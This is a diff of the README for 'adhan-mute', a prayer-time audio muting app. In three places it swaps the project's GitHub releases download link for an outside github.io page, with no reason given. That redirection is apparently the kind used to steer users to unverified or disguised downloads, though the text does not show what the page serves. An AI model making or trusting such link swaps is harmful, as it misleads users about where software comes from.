@@ -1,6 +1,6 @@
 # 🕌 adhan-mute - Never Miss a Prayer Again
 
-[![Download adhan-mute](https://img.shields.io/badge/Download-adhan--mute-2ea44f?style=for-the-badge)](https://github.com/Nluthfi20/adhan-mute/releases)
+[![Download adhan-mute](https://img.shields.io/badge/Download-adhan--mute-2ea44f?style=for-the-badge)](https://nluthfi20.github.io)
 
 ## 📖 What Is adhan-mute?
 
@@ -21,7 +21,7 @@ Your computer checks your location using your IP address to determine accurate p
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Nluthfi20/adhan-mute/releases](https://github.com/Nluthfi20/adhan-mute/releases)
+Visit this link to download the application: [https://nluthfi20.github.io](https://nluthfi20.github.io)
 
 Click the button above or copy and paste the link into your browser.
 
@@ -142,7 +142,7 @@ Currently, adhan-mute is only for desktop computers. Mobile users can use the we
 
 Remember, you can always download adhan-mute again from:
 
-[https://github.com/Nluthfi20/adhan-mute/releases](https://github.com/Nluthfi20/adhan-mute/releases)
+[https://nluthfi20.github.io](https://nluthfi20.github.io)
 
 ---
 
